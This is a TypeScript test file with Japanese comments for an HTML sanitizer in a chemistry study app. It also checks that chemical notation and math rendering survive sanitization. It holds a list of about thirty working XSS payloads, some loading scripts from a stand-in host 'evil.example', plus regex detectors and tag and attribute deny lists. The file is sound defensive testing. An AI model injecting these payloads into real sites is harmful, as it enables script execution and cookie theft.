/**
 * サニタイザ（src/utils/sanitizeHtml.ts）の回帰テスト
 *
 * ■ このテストが守っているもの
 *   1. XSS が通らないこと（攻撃ペイロードを網羅的に流す）
 *   2. 化学表記の表示が壊れないこと
 *      添字 <sub>/<sup>、分数の <span style="...">、強調 <mark>、
 *      改行 <br/>、整形エンジンの冪等マーカー <!--fmt-v1--> は
 *      「通ってよいもの」なので、消えていないかを必ず確認する。
 *      ここを守らないと「安全にしたら表示が崩れた」になる。
 *   3. stripHtmlToText が DOM を使わずに正しくテキスト化すること
 *
 * ■ なぜ実装関数を直接呼ぶか
 *   サニタイズは「入出力が決まっている純関数」なので、
 *   ソーステキストの検査ではなく実際に通して結果を見るのが確実。
 */
import { describe, it, expect } from 'vitest';
import {
  sanitizeInlineHtml,
  stripHtmlToText,
  SANITIZER_ALLOWLIST,
} from '../src/utils/sanitizeHtml';

/**
 * 出力に「ブラウザが実行し得るもの」が残っていないかを判定する。
 *
 * ★テキストとして残っている文字列は危険ではない★
 *   例えば入力 `" onerror="alert(1)` の出力はそのまま
 *   `" onerror="alert(1)` だが、これは要素の中身のテキストなので
 *   ブラウザは属性として解釈しない。単純な文字列一致で判定すると
 *   こうした安全な出力を誤検知してしまう。
 *   そこで「タグとして成立している部分」だけを取り出して検査する。
 */
function looksDangerous(html: string): boolean {
  // 実行を伴うタグが1つでも成立していたらNG
  //
  // ★svg / path はこの一覧に入れない★
  //   数式（KaTeX）の根号・伸びる括弧は <svg><path d="…"/></svg> で
  //   描かれるため、許可タグにしている。空の <svg> 自体は
  //   スクリプトも外部読み込みも起こせないので無害。
  //   危険なのは「中に置ける実行可能要素」と「URL属性」なので、
  //   それは下の属性検査と、SVG専用のテスト（後述）で担保する。
  if (/<\s*\/?\s*(script|iframe|img|object|embed|link|meta|base|style|form|input|button|audio|video|math|template|frame|foreignObject|animate|use)\b/i.test(html)) {
    return true;
  }
  // 成立しているタグを取り出し、その「属性名」だけを検査する
  for (const tag of html.match(/<[a-zA-Z][^>]*>/g) || []) {
    const attrSource = tag.replace(/^<\s*[a-zA-Z][a-zA-Z0-9]*/, '').replace(/\/?>$/, '');

    // ★引用符で囲まれた属性値を先に取り除くのが要点★
    //   サニタイズ後は値の中の `"` が &quot; になっているため、
    //   例えば class="a&quot; onload=&quot;alert(1)" は
    //   ブラウザから見れば class 属性1つでしかない（onload は文字列の一部）。
    //   値を残したまま検査すると、この安全な出力を誤検知してしまう。
    const attrNamesOnly = attrSource.replace(/"[^"]*"|'[^']*'/g, '=""');

    // 属性名として on* が現れたらNG
    if (/(?:^|\s)on[a-z]+\s*=/i.test(attrNamesOnly)) return true;
    // URLを持つ属性が復活していたらNG
    if (/(?:^|\s)(?:href|src|srcset|srcdoc|action|formaction|data|xlink:href)\s*=/i.test(attrNamesOnly)) {
      return true;
    }
    // 引用符の外に javascript: が出ていたらNG
    if (/javascript\s*:/i.test(attrNamesOnly)) return true;
  }
  return false;
}

// ------------------------------------------------------------------
// 1. 攻撃ペイロード
// ------------------------------------------------------------------
const XSS_PAYLOADS: Array<[string, string]> = [
  ['画像のonerror', '<img src=x onerror=alert(1)>'],
  ['閉じないimg', '<img src=x onerror=alert(1)//'],
  ['大文字SCRIPT', '<SCRIPT SRC=//evil.example/x.js></SCRIPT>'],
  ['scriptと中身', '<script>alert(document.cookie)</script>'],
  ['属性からの脱出', '" onerror="alert(1)'],
  ['SVGのonload', '"><svg onload=alert(1)>'],
  ['SVG入れ子', '<svg><animate onbegin=alert(1) attributeName=x></svg>'],
  ['iframeのjavascript', '<iframe src="javascript:alert(1)"></iframe>'],
  ['iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['aタグのjavascript', '<a href="javascript:alert(1)">click</a>'],
  ['styleのurl()', '<div style="background:url(javascript:alert(1))">x</div>'],
  ['styleのexpression', '<div style="width:expression(alert(1))">x</div>'],
  ['detailsのontoggle', '<details open ontoggle=alert(1)>x</details>'],
  ['bodyのonload', '<body onload=alert(1)>'],
  ['inputのautofocus', '<input onfocus=alert(1) autofocus>'],
  ['formとbutton', '<form action="//evil.example"><button>送信</button></form>'],
  ['mathのmtext経由', '<math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>'],
  ['objectのdata', '<object data="data:text/html,<script>alert(1)</script>"></object>'],
  ['embed', '<embed src="//evil.example/x.swf">'],
  ['templateの中', '<template><img src=x onerror=alert(1)></template>'],
  ['noscript', '<noscript><img src=x onerror=alert(1)></noscript>'],
  ['属性名の前に改行', '<img\nsrc=x\nonerror=alert(1)>'],
  ['タブ区切り属性', '<img\tsrc=x\tonerror=alert(1)>'],
  ['コメント偽装', '<!--><img src=x onerror=alert(1)>-->'],
  ['大文字混在ImG', '<ImG SrC=x OnErRoR=alert(1)>'],
  ['bgsound', '<bgsound src="javascript:alert(1)">'],
  ['metaリフレッシュ', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
  ['baseタグ', '<base href="//evil.example/">'],
  ['linkでCSS読込', '<link rel="stylesheet" href="//evil.example/x.css">'],
  ['videoのonerror', '<video><source onerror=alert(1)></video>'],
];

describe('sanitizeInlineHtml — XSSが通らない', () => {
  for (const [name, payload] of XSS_PAYLOADS) {
    it(`${name} を無害化する`, () => {
      const out = sanitizeInlineHtml(payload);
      expect(looksDangerous(out), `危険な出力: ${out}`).toBe(false);
    });
  }

  it('イベントハンドラ属性はすべて落ちる', () => {
    const handlers = ['onerror', 'onload', 'onclick', 'onmouseover', 'ontoggle', 'onfocus', 'onanimationend'];
    for (const h of handlers) {
      const out = sanitizeInlineHtml(`<span ${h}="alert(1)">x</span>`);
      expect(out.toLowerCase()).not.toContain(h);
      // 中身のテキストは残る（情報を失わない）
      expect(out).toContain('x');
    }
  });

  it('href / src は許可リストに無いので必ず落ちる', () => {
    expect(sanitizeInlineHtml('<span src="x">a</span>')).not.toContain('src');
    // 許可タグ外の a はタグごと消え、テキストだけ残る
    expect(sanitizeInlineHtml('<a href="http://ex.example">a</a>')).toBe('a');
  });

  it('script / style は中身ごと捨てる（テキストとして漏らさない）', () => {
    expect(sanitizeInlineHtml('前<script>alert(1)</script>後')).toBe('前後');
    expect(sanitizeInlineHtml('前<style>body{}</style>後')).toBe('前後');
  });

  it('許可タグ外はタグだけ落とし、中身のテキストは残す', () => {
    // <img> は自己完結なので消えるだけ
    expect(sanitizeInlineHtml('A<img src=x>B')).toBe('AB');
    // <a> は中身のテキストを保つ（解説文が消えると学習上の損失になる）
    expect(sanitizeInlineHtml('<a>重要な語</a>')).toBe('重要な語');
  });

  it('テキスト中の < > & はエスケープされる', () => {
    expect(sanitizeInlineHtml('a < b > c & d')).toBe('a &lt; b &gt; c &amp; d');
  });

  it('正しい実体参照は二重エスケープしない', () => {
    expect(sanitizeInlineHtml('a&nbsp;b')).toBe('a&nbsp;b');
    expect(sanitizeInlineHtml('&#39;')).toBe('&#39;');
    expect(sanitizeInlineHtml('&amp;')).toBe('&amp;');
    // 実体参照になっていない裸の & はエスケープする
    expect(sanitizeInlineHtml('A & B')).toBe('A &amp; B');
  });

  it('属性値の引用符をエスケープし、属性を増やせないようにする', () => {
    // 単一引用符の値の中に `"` を仕込んで class 属性から脱出しようとする攻撃。
    // 出力では `"` が &quot; になるため、onload は属性ではなく
    // class の値（文字列）の一部にしかならない。
    const out = sanitizeInlineHtml('<span class=\'a" onload="alert(1)\'>x</span>');
    expect(looksDangerous(out)).toBe(false);
    expect(out).toContain('&quot;');
    // 生の `"` で属性が切れていないことを確認する（属性は class だけ）
    expect(out.match(/"/g)?.length).toBe(2);
  });

  it('空文字・未定義相当を安全に扱う', () => {
    expect(sanitizeInlineHtml('')).toBe('');
    // 途中で切れたタグも落ちる
    expect(looksDangerous(sanitizeInlineHtml('<img src=x onerror='))).toBe(false);
  });
});

// ------------------------------------------------------------------
// 2. 正当な化学表記が壊れない
// ------------------------------------------------------------------
describe('sanitizeInlineHtml — 化学表記の表示を壊さない', () => {
  it('添字・上付きは残る（H₂O / SO₄²⁻ の描画に必須）', () => {
    const html = 'H<sub class="text-[0.75em]">2</sub>O と SO<sub>4</sub><sup>2-</sup>';
    const out = sanitizeInlineHtml(html);
    expect(out).toContain('<sub class="text-[0.75em]">2</sub>');
    expect(out).toContain('<sup>2-</sup>');
  });

  it('style 属性は残る（分数・数式フォントの指定に必要）', () => {
    const html = '<span style="font-family: \'Cambria Math\', serif; vertical-align: middle;">x</span>';
    const out = sanitizeInlineHtml(html);
    expect(out).toContain('font-family');
    expect(out).toContain('vertical-align');
  });

  it('危険な style 値だけを落とし、安全な style は通す', () => {
    expect(sanitizeInlineHtml('<span style="color:red">x</span>')).toContain('color:red');
    expect(sanitizeInlineHtml('<span style="background:url(x)">x</span>')).not.toContain('url(');
  });

  it('class 属性（Tailwind）は完全に保たれる', () => {
    const cls = 'inline-flex flex-col justify-center text-center mx-1';
    expect(sanitizeInlineHtml(`<span class="${cls}">x</span>`)).toContain(cls);
  });

  it('<br/> は自己終了タグとして残る（改行が消えない）', () => {
    expect(sanitizeInlineHtml('行1<br/>行2')).toBe('行1<br />行2');
    expect(sanitizeInlineHtml('行1<br>行2')).toBe('行1<br />行2');
  });

  it('整形エンジンの冪等マーカー <!--fmt-v1--> が生き残る', () => {
    // これが消えると enhanceExplanation が二重適用され、解説が崩れる
    expect(sanitizeInlineHtml('<!--fmt-v1-->本文')).toBe('<!--fmt-v1-->本文');
  });

  it('想定外の形のコメントは捨てる（コメント偽装の封じ込め）', () => {
    // 壊れたコメントはブラウザ間で終端の解釈が揺れるため、通さない
    const out = sanitizeInlineHtml('<!--> <img src=x onerror=alert(1)> -->');
    expect(out).not.toContain('<!--');
    expect(out).not.toContain('onerror');
  });

  it('<mark> と <u>（強調表示）は残る', () => {
    expect(sanitizeInlineHtml('<mark class="bg-yellow-200">重要</mark>')).toContain('<mark');
    expect(sanitizeInlineHtml('<u>下線</u>')).toBe('<u>下線</u>');
  });

  it('解答アコーディオン（details / summary）は残る', () => {
    const html = '<details class="lc-ans" open><summary class="lc-ans-sum">解答</summary><p>答え</p></details>';
    const out = sanitizeInlineHtml(html);
    expect(out).toContain('<details class="lc-ans" open>');
    expect(out).toContain('<summary class="lc-ans-sum">');
    expect(out).toContain('</details>');
  });

  it('表（colspan / rowspan / scope）は残る', () => {
    const html = '<table><thead><tr><th scope="col" colspan="2">A</th></tr></thead><tbody><tr><td rowspan="2">B</td></tr></tbody></table>';
    const out = sanitizeInlineHtml(html);
    expect(out).toContain('colspan="2"');
    expect(out).toContain('rowspan="2"');
    expect(out).toContain('scope="col"');
  });

  it('何度通しても結果が変わらない（冪等）', () => {
    const html = 'H<sub class="s">2</sub>O <mark>重要</mark><br/><!--fmt-v1-->';
    const once = sanitizeInlineHtml(html);
    expect(sanitizeInlineHtml(once)).toBe(once);
  });
});

// ------------------------------------------------------------------
// 3. 許可リスト自体の健全性
// ------------------------------------------------------------------
describe('許可リストの健全性', () => {
  it('リソースを読み込む／スクリプトを走らせるタグは許可されていない', () => {
    const forbidden = [
      'script', 'iframe', 'img', 'object', 'embed', 'link', 'meta',
      'base', 'style', 'form', 'input', 'button', 'audio', 'video', 'a',
    ];
    for (const tag of forbidden) {
      expect(SANITIZER_ALLOWLIST.tags.has(tag), `${tag} が許可されている`).toBe(false);
    }
  });

  /**
   * <svg>/<path> だけは数式（KaTeX）の描画に必要なので許可している。
   * 根号の斜線・伸びる括弧・矢印はフォントの文字ではなく
   * SVG のパスで描かれるため、落とすと「√ の記号が消える」。
   *
   * 危険なのは SVG そのものではなく
   *   ・SVG の中に置ける実行可能要素（script / animate / foreignObject …）
   *   ・URL を運ぶ属性（href / xlink:href）
   * なので、そこを閉じてあることをここで固定する。
   */
  it('数式描画用の svg / path は許可されている（根号や括弧の描画に必要）', () => {
    expect(SANITIZER_ALLOWLIST.tags.has('svg')).toBe(true);
    expect(SANITIZER_ALLOWLIST.tags.has('path')).toBe(true);
  });

  it('SVG の中で実行可能／外部参照になる要素は中身ごと捨てる', () => {
    const dangerousInSvg = [
      'foreignobject', 'animate', 'animatetransform', 'animatemotion',
      'set', 'use', 'image', 'script',
    ];
    for (const tag of dangerousInSvg) {
      expect(
        SANITIZER_ALLOWLIST.dropWithContent.has(tag),
        `${tag} が中身ごと捨てられていない`,
      ).toBe(true);
    }
  });

  it('svg / path に URL 属性やイベント属性は通らない', () => {
    const cases = [
      '<svg onload=alert(1)><path d="M0,0"/></svg>',
      '<path d="M0,0" onclick=alert(1)/>',
      '<svg><use href="http://evil.example/x#a"/></svg>',
      '<svg><image href="javascript:alert(1)"/></svg>',
      '<svg xlink:href="javascript:alert(1)"><path d="M0"/></svg>',
    ];
    for (const payload of cases) {
      const out = sanitizeInlineHtml(payload);
      expect(/on[a-z]+\s*=/i.test(out), `イベント属性が残った: ${out}`).toBe(false);
      expect(/href/i.test(out), `URL属性が残った: ${out}`).toBe(false);
      expect(/javascript\s*:/i.test(out), `javascript: が残った: ${out}`).toBe(false);
    }
  });

  it('KaTeX が描く根号の svg/path は保持される（数式が欠けない）', () => {
    // 実際の KaTeX 出力に近い形
    const katexSqrt =
      '<span class="katex"><span class="sqrt"><svg xmlns="http://www.w3.org/2000/svg" '
      + 'width="400em" height="1.08em" viewBox="0 0 400000 1080" '
      + 'preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8"/>'
      + '</svg></span></span>';
    const out = sanitizeInlineHtml(katexSqrt);
    expect(out).toContain('<svg');
    expect(out).toContain('<path');
    expect(out).toContain('d="M95,702');
    // viewBox は大文字小文字が意味を持つので保たれること
    expect(out).toContain('viewBox=');
    expect(out).toContain('preserveAspectRatio=');
  });

  it('URLを持つ属性・イベント属性は許可されていない', () => {
    const forbidden = ['href', 'src', 'srcset', 'srcdoc', 'action', 'formaction', 'onerror', 'onload', 'onclick', 'style:'];
    for (const attr of forbidden) {
      expect(SANITIZER_ALLOWLIST.attrs.has(attr), `${attr} が許可されている`).toBe(false);
    }
  });

  it('許可属性は on で始まらない（イベントハンドラの混入防止）', () => {
    for (const attr of SANITIZER_ALLOWLIST.attrs) {
      expect(attr.startsWith('on')).toBe(false);
    }
  });
});

// ------------------------------------------------------------------
// 4. stripHtmlToText
// ------------------------------------------------------------------
describe('stripHtmlToText', () => {
  it('タグを除いてテキストだけを返す', () => {
    expect(stripHtmlToText('<p>物質量の<strong>基本</strong></p>')).toBe('物質量の基本');
  });

  it('DOM を作らないので Node でも同じ結果になる（document 不使用）', () => {
    // このテストは environment: node でも通る＝DOM非依存の証明
    expect(stripHtmlToText('<div>a</div>')).toBe('a');
  });

  it('script / style の中身は漏らさない', () => {
    expect(stripHtmlToText('前<script>alert(1)</script>後')).toBe('前 後');
    expect(stripHtmlToText('前<style>body{color:red}</style>後')).toBe('前 後');
  });

  it('img の onerror がテキストとして残らない', () => {
    expect(stripHtmlToText('<img src=x onerror=alert(1)>問題文')).toBe('問題文');
  });

  it('ブロック要素の境界は空白になり、単語がくっつかない', () => {
    expect(stripHtmlToText('<p>あ</p><p>い</p>')).toBe('あ い');
    expect(stripHtmlToText('1行目<br>2行目')).toBe('1行目 2行目');
    expect(stripHtmlToText('<li>A</li><li>B</li>')).toBe('A B');
  });

  it('実体参照を元の文字に戻す', () => {
    expect(stripHtmlToText('a&lt;b&gt;c&amp;d')).toBe('a<b>c&d');
    expect(stripHtmlToText('a&nbsp;b')).toBe('a b');
  });

  it('未閉鎖のタグも取り除く', () => {
    expect(stripHtmlToText('本文<div class="')).toBe('本文');
  });

  it('空・空白のみは空文字を返す', () => {
    expect(stripHtmlToText('')).toBe('');
    expect(stripHtmlToText('<p>   </p>')).toBe('');
  });

  it('連続する空白は1つにまとめる（一覧のプレビューが崩れない）', () => {
    expect(stripHtmlToText('a   \n\n  b')).toBe('a b');
  });
});
